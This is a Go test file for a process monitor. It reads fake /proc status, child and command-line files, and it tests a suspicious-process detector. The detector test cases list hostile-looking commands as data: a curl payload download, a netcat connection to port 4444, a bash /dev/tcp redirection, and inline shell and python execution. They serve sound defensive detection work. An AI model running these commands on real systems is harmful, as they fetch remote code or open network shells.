package monitor

import (
	"os"
	"path/filepath"
	"reflect"
	"testing"
	"time"
)

func TestReadStatus(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/status", "Name:\targus\nState:\tS (sleeping)\nVmRSS:\t2048 kB\nThreads:\t7\nUid:\t1000\n")

	got := ReadStatus(123)
	want := map[string]string{
		"State":   "S (sleeping)",
		"VmRSS":   "2048 kB",
		"Threads": "7",
	}

	if !reflect.DeepEqual(got, want) {
		t.Fatalf("ReadStatus(123) = %#v, want %#v", got, want)
	}
}

func TestReadStatusMalformedProcContent(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/status", "State: R (running)\nVmRSS:\nThreads:\t4\nVmRSS:\t4096 kB\n")

	got := ReadStatus(123)
	want := map[string]string{
		"Threads": "4",
		"VmRSS":   "4096 kB",
	}

	if !reflect.DeepEqual(got, want) {
		t.Fatalf("ReadStatus malformed content = %#v, want %#v", got, want)
	}
}

func TestReadStatusMissingFileReturnsEmptyMap(t *testing.T) {
	useFakeProc(t)

	got := ReadStatus(404)
	if len(got) != 0 {
		t.Fatalf("ReadStatus missing file = %#v, want empty map", got)
	}
}

func TestReadStatusEmptyFileReturnsEmptyMap(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/status", "")

	got := ReadStatus(123)
	if len(got) != 0 {
		t.Fatalf("ReadStatus empty file = %#v, want empty map", got)
	}
}

func TestReadChildren(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/task/123/children", "456 789\n101112\t")

	got := ReadChildren(123)
	want := []string{"456", "789", "101112"}

	if !reflect.DeepEqual(got, want) {
		t.Fatalf("ReadChildren(123) = %#v, want %#v", got, want)
	}
}

func TestReadChildrenMissingFileReturnsEmptySlice(t *testing.T) {
	useFakeProc(t)

	got := ReadChildren(404)
	if len(got) != 0 {
		t.Fatalf("ReadChildren missing file = %#v, want empty slice", got)
	}
}

func TestReadChildrenEmptyFileReturnsEmptySlice(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/task/123/children", "")

	got := ReadChildren(123)
	if len(got) != 0 {
		t.Fatalf("ReadChildren empty file = %#v, want empty slice", got)
	}
}

func TestReadProcessName(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/comm", "python3\n")

	got := ReadProcessName("123")
	if got != "python3" {
		t.Fatalf("ReadProcessName(123) = %q, want %q", got, "python3")
	}
}

func TestReadProcessNameMissingFileReturnsEmptyString(t *testing.T) {
	useFakeProc(t)

	got := ReadProcessName("404")
	if got != "" {
		t.Fatalf("ReadProcessName missing file = %q, want empty string", got)
	}
}

func TestReadProcessNameEmptyFileReturnsEmptyString(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/comm", "")

	got := ReadProcessName("123")
	if got != "" {
		t.Fatalf("ReadProcessName empty file = %q, want empty string", got)
	}
}

func TestReadProcessCommand(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/cmdline", "python3\x00script.py\x00--verbose\x00")

	got := ReadProcessCommand("123")
	want := "python3 script.py --verbose"
	if got != want {
		t.Fatalf("ReadProcessCommand(123) = %q, want %q", got, want)
	}
}

func TestReadProcessCommandMissingFileReturnsEmptyString(t *testing.T) {
	useFakeProc(t)

	got := ReadProcessCommand("404")
	if got != "" {
		t.Fatalf("ReadProcessCommand missing file = %q, want empty string", got)
	}
}

func TestReadProcessCommandEmptyFileReturnsEmptyString(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/cmdline", "")

	got := ReadProcessCommand("123")
	if got != "" {
		t.Fatalf("ReadProcessCommand empty file = %q, want empty string", got)
	}
}

func TestReadChildrenDetails(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/task/123/children", "456 789")
	writeProcFile(t, root, "456/comm", "python3\n")
	writeProcFile(t, root, "456/cmdline", "python3\x00worker.py\x00")
	writeProcFile(t, root, "789/comm", "bash\n")
	writeProcFile(t, root, "789/cmdline", "bash\x00-c\x00id\x00")

	got := ReadChildrenDetails(123)
	want := []ChildProcessDetails{
		{PID: "456", Name: "python3", Command: "python3 worker.py"},
		{PID: "789", Name: "bash", Command: "bash -c id"},
	}

	if !reflect.DeepEqual(got, want) {
		t.Fatalf("ReadChildrenDetails(123) = %#v, want %#v", got, want)
	}
}

func TestReadChildrenDetailsMissingChildFiles(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/task/123/children", "456")

	got := ReadChildrenDetails(123)
	want := []ChildProcessDetails{{PID: "456", Name: "", Command: ""}}

	if !reflect.DeepEqual(got, want) {
		t.Fatalf("ReadChildrenDetails missing child files = %#v, want %#v", got, want)
	}
}

func TestIsSuspiciousProcess(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name        string
		processName string
		command     string
		want        bool
	}{
		{
			name:        "suspicious process name",
			processName: "bash",
			command:     "bash",
			want:        true,
		},
		{
			name:        "suspicious command pattern",
			processName: "python3",
			command:     "python3 -c 'print(1)'",
			want:        true,
		},
		{
			name:        "normal process name and command",
			processName: "python3",
			command:     "python3 script.py",
			want:        false,
		},
		{
			name:        "empty input",
			processName: "",
			command:     "",
			want:        false,
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			got := IsSuspiciousProcess(tt.processName, tt.command)
			if got != tt.want {
				t.Fatalf("IsSuspiciousProcess(%q, %q) = %v, want %v", tt.processName, tt.command, got, tt.want)
			}
		})
	}
}

func TestIsSuspiciousCommand(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{
			name:    "bash command execution",
			command: "/bin/bash -c 'id'",
			want:    true,
		},
		{
			name:    "sh command execution",
			command: "/bin/sh -c 'id'",
			want:    true,
		},
		{
			name:    "python command execution",
			command: "python3 -c 'import os'",
			want:    true,
		},
		{
			name:    "download command",
			command: "curl https://example.test/payload.py",
			want:    true,
		},
		{
			name:    "netcat command",
			command: "nc 127.0.0.1 4444",
			want:    true,
		},
		{
			name:    "tcp redirection",
			command: "bash -c 'cat </dev/tcp/127.0.0.1/80'",
			want:    true,
		},
		{
			name:    "normal command",
			command: "python3 script.py --input data.json",
			want:    false,
		},
		{
			name:    "malformed command",
			command: "\x00\x00",
			want:    false,
		},
		{
			name:    "empty command",
			command: "",
			want:    false,
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			got := IsSuspiciousCommand(tt.command)
			if got != tt.want {
				t.Fatalf("IsSuspiciousCommand(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestPollStatusSamplesImmediately(t *testing.T) {
	root := useFakeProc(t)
	writeProcFile(t, root, "123/status", "Name:\tpython3\nState:\tR (running)\nVmRSS:\t2048 kB\nThreads:\t1\n")

	done := make(chan struct{})
	memoryExceeded := make(chan struct{}, 1)
	close(done)

	got := PollStatus(123, time.Hour, done, 100, memoryExceeded)
	if got["PeakVmRSS"] != "2048 kB" {
		t.Fatalf("PollStatus immediate PeakVmRSS = %q, want %q", got["PeakVmRSS"], "2048 kB")
	}
}

func useFakeProc(t *testing.T) string {
	t.Helper()

	previous := procRoot
	root := t.TempDir()
	procRoot = root
	t.Cleanup(func() {
		procRoot = previous
	})

	return root
}

func writeProcFile(t *testing.T, root, name, content string) {
	t.Helper()

	path := filepath.Join(root, filepath.FromSlash(name))
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatalf("create proc fixture directory: %v", err)
	}
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("write proc fixture file: %v", err)
	}
}
